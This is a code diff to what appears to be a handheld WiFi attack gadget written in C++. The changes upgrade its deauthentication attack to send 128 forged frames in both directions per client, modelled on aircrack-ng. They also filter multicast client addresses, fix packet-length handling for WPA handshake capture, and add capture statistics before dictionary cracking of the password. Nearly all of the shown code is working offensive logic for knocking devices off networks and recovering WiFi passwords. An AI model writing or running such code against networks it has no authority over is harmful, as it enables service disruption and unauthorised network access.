@@ -42,6 +42,7 @@ bool scan_for_networks(WiFiController& wifi, std::vector<WiFiNetwork>& networks,
     std::cout << "\n[STATE] Starting beacon scan..." << std::endl;
 
     networks.clear();
+    leds.all_off();  // Clear previous state LEDs
     leds.set_blink(LEDController::YELLOW, 500);
     oled.show_scanning(0);
 
@@ -87,7 +88,7 @@ bool scan_for_networks(WiFiController& wifi, std::vector<WiFiNetwork>& networks,
 
                 if (!normalize_80211_frame(wifi.get_handle(),
                                           (const uint8_t*)packet,
-                                          header->len,
+                                          header->caplen,
                                           frame,
                                           frame_len)) {
                     continue;
@@ -146,7 +147,7 @@ bool find_clients(WiFiController& wifi, const WiFiNetwork& target,
 
             if (!normalize_80211_frame(wifi.get_handle(),
                                       (const uint8_t*)packet,
-                                      header->len,
+                                      header->caplen,
                                       frame,
                                       frame_len)) {
                 continue;
@@ -158,6 +159,17 @@ bool find_clients(WiFiController& wifi, const WiFiNetwork& target,
 
                 // Check if this is for our target AP
                 if (compare_mac(ap_mac, target.bssid)) {
+                    // Filter out multicast/broadcast MACs (bit 0 of byte 0 is multicast bit)
+                    bool is_multicast = (client_mac[0] & 0x01) != 0;
+                    bool is_broadcast = (client_mac[0] == 0xFF && client_mac[1] == 0xFF &&
+                                        client_mac[2] == 0xFF && client_mac[3] == 0xFF &&
+                                        client_mac[4] == 0xFF && client_mac[5] == 0xFF);
+
+                    // Skip multicast/broadcast addresses - they're not real clients
+                    if (is_multicast || is_broadcast) {
+                        continue;
+                    }
+
                     // Check if client already in list
                     bool found = false;
                     for (auto& client : clients) {
@@ -187,13 +199,14 @@ bool find_clients(WiFiController& wifi, const WiFiNetwork& target,
     return !clients.empty();
 }
 
-bool capture_handshake(WiFiController& wifi, WiFiNetwork& target, 
+bool capture_handshake(WiFiController& wifi, WiFiNetwork& target,
                       OLEDDisplay& oled, LEDController& leds,
                       ButtonController& buttons, bool send_deauth,
                       const std::vector<ClientDevice>* target_clients) {
     std::cout << "\n[STATE] Capturing handshake for " << target.get_display_ssid() << std::endl;
-    
+
     wifi.set_channel(target.channel);
+    leds.all_off();  // Clear previous state LEDs
     leds.set_blink(LEDController::BLUE, 500);
     
     std::string mode = send_deauth ? "Deauth Attack" : "Waiting Handshake";
@@ -201,39 +214,66 @@ bool capture_handshake(WiFiController& wifi, WiFiNetwork& target,
     
     // Send deauth packets if requested
     if (send_deauth && target_clients && !target_clients->empty()) {
-        std::cout << "[INFO] Sending deauth packets..." << std::endl;
+        std::cout << "[INFO] Sending bidirectional deauth packets..." << std::endl;
 
         for (const auto& client : *target_clients) {
-            auto deauth_frame = PacketProcessor::craft_deauth_frame(target.bssid, client.mac);
+            // Send deauth in BOTH directions for better results
+            // Direction 1: AP → Client (source=AP, dest=Client, bssid=AP)
+            auto deauth_ap_to_client = PacketProcessor::craft_deauth_frame(target.bssid, client.mac, target.bssid);
 
-            std::cout << "[DEBUG] Deauth frame details:" << std::endl;
-            std::cout << "[DEBUG]   Frame size: " << deauth_frame.size() << " bytes" << std::endl;
-            std::cout << "[DEBUG]   Target AP (BSSID): " << mac_to_string(target.bssid) << std::endl;
-            std::cout << "[DEBUG]   Target Client: " << mac_to_string(client.mac) << std::endl;
-            std::cout << "[DEBUG]   Frame hex dump: ";
-            for (size_t i = 0; i < deauth_frame.size(); i++) {
-                printf("%02X ", deauth_frame[i]);
-            }
-            std::cout << std::endl;
+            // Direction 2: Client → AP (source=Client, dest=AP, bssid=AP)
+            auto deauth_client_to_ap = PacketProcessor::craft_deauth_frame(client.mac, target.bssid, target.bssid);
 
-            // Send multiple deauth frames
-            for (int i = 0; i < 5; i++) {
-                int sent = pcap_inject(wifi.get_handle(), deauth_frame.data(), deauth_frame.size());
-                std::cout << "[DEBUG] pcap_inject returned: " << sent << " bytes" << std::endl;
-                if (sent < 0) {
-                    std::cerr << "[ERROR] pcap_inject failed: " << pcap_geterr(wifi.get_handle()) << std::endl;
+            std::cout << "[DEBUG] ==== Bidirectional Deauth ====" << std::endl;
+            std::cout << "[DEBUG] Target AP: " << mac_to_string(target.bssid) << std::endl;
+            std::cout << "[DEBUG] Target Client: " << mac_to_string(client.mac) << std::endl;
+
+            // Send 128 deauth packets total (64 AP→Client + 64 Client→AP, like aircrack-ng)
+            // More packets = higher success rate against clients that ignore sporadic deauths
+            const int PACKETS_PER_DIRECTION = 64;
+            int success_count = 0;
+
+            for (int i = 0; i < PACKETS_PER_DIRECTION * 2; i++) {
+                auto& frame = (i % 2 == 0) ? deauth_ap_to_client : deauth_client_to_ap;
+                const char* direction = (i % 2 == 0) ? "AP→Client" : "Client→AP";
+
+                int sent = pcap_inject(wifi.get_handle(), frame.data(), frame.size());
+
+                // Show first 2 packets for debugging
+                if (i < 2) {
+                    std::cout << "[DEBUG] " << direction << " deauth #" << (i/2 + 1) << ": ";
+                    for (size_t j = 0; j < 26 && j < frame.size(); j++) {
+                        printf("%02X ", frame[j]);
+                    }
+                    std::cout << " | sent=" << sent << " bytes" << std::endl;
                 }
-                usleep(100000); // 100ms between packets
+
+                if (sent > 0) {
+                    success_count++;
+                } else {
+                    std::cerr << "[ERROR] Deauth inject failed: " << pcap_geterr(wifi.get_handle()) << std::endl;
+                }
+
+                // 10ms delay to avoid overwhelming the network (aircrack-ng uses ~15ms)
+                usleep(10000);
             }
-            std::cout << "[DEAUTH] Sent 5 packets to " << mac_to_string(client.mac) << std::endl;
+            std::cout << "[DEAUTH] Sent " << success_count << "/" << (PACKETS_PER_DIRECTION * 2)
+                      << " packets to " << mac_to_string(client.mac) << std::endl;
         }
 
-        std::cout << "[INFO] Deauth packets sent, waiting for handshake..." << std::endl;
+        std::cout << "[INFO] Deauth complete. Waiting 500ms before capture..." << std::endl;
+        usleep(500000); // Wait for client to start reconnecting
     }
     
     // Wait for handshake (max 60 seconds)
     time_t start = time(NULL);
     time_t deadline = start + 60;
+    int total_packets = 0;
+    int data_packets = 0;
+    int eapol_packets = 0;
+
+    std::cout << "[INFO] === Starting packet capture (60 sec timeout) ===\n";
+
     
     while (time(NULL) < deadline) {
         // Check for double ESC
@@ -247,17 +287,53 @@ bool capture_handshake(WiFiController& wifi, WiFiNetwork& target,
         const u_char* packet;
         
         int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
-        if (res == 1) {
-            // Strip radiotap header to get raw 802.11 frame
+        if (res == 1 && header && packet) {
+            total_packets++;
+
+            // Print progress every 100 packets
+            if (total_packets % 100 == 0) {
+                int elapsed = (int)(time(NULL) - start);
+                std::cout << "[CAPTURE] " << total_packets << " packets | "
+                          << "Data: " << data_packets << " | EAPOL: " << eapol_packets
+                          << " | Elapsed: " << elapsed << "s\n";
+            }
+
             const uint8_t* frame = nullptr;
             int frame_len = 0;
 
             if (!normalize_80211_frame(wifi.get_handle(),
-                                      (const uint8_t*)packet,
-                                      header->len,
-                                      frame,
-                                      frame_len)) {
+                 (const uint8_t*)packet,
+                 header->caplen,
+                 frame,
+                 frame_len)) {
+                std::cout << "[DEBUG] normalize_80211_frame failed (caplen="<< header->caplen << " len=" << header->len << ")\n";
+
+
+                std::cout << "[DEBUG] first 16 bytes: ";
+                int n = (header->caplen < 16) ? (int)header->caplen : 16;
+                for (int i = 0; i < n; i++) {
+                    printf("%02X ", packet[i]);
+                }
+                std::cout << "\n";
+
+                // also print what normalize reads as radiotap length (bytes 2-3)
+                if (header->caplen >= 4) {
+                    int rt_len = packet[2] | (packet[3] << 8);
+                    std::cout << "[DEBUG] rt_len(from bytes2-3)=" << rt_len
+                              << " ver=" << (int)packet[0]
+                              << " pad=" << (int)packet[1]
+                              << "\n";
+                }
+
                 continue;
+            }
+
+            // Count data frames
+            if (frame_len >= 2) {
+                uint8_t frame_type_bits = (frame[0] & 0x0C);
+                if (frame_type_bits == 0x08) {
+                    data_packets++;
+                }
             }
 
             if (PacketProcessor::is_eapol_frame(frame, frame_len)) {
@@ -584,10 +660,11 @@ int main() {
 handshake_success:
             // We have a complete handshake!
             WiFiNetwork& captured_net = networks[menu_idx - 1];
-            
+
             std::cout << "\n[SUCCESS] Handshake captured successfully!" << std::endl;
             cracker.log_handshake_info(captured_net);
-            
+
+            leds.all_off();  // Clear previous state LEDs
             leds.set_solid(LEDController::BLUE, true);
             oled.show_message("Success!", {"Handshake captured", "Choose dictionary"});
             sleep(2);
@@ -619,6 +696,7 @@ handshake_success:
                     }
                     
                     std::cout << "[STATE] Starting crack with " << dict_file << std::endl;
+                    leds.all_off();  // Clear previous state LEDs
                     leds.set_blink(LEDController::RED, 1000);
                     
                     // Progress callback
@@ -644,6 +722,7 @@ handshake_success:
                         if (!password.empty()) {
                             // Success!
                             std::cout << "\n[FINAL] Password: " << password << std::endl;
+                            leds.all_off();  // Clear previous state LEDs
                             leds.set_blink(LEDController::GREEN, 1000);
                             oled.show_success(password);
                             
@@ -671,6 +750,7 @@ handshake_success:
                             }
                         } else {
                             // Failed
+                            leds.all_off();  // Clear previous state LEDs
                             leds.set_solid(LEDController::RED, true);
                             oled.show_failure();
                             
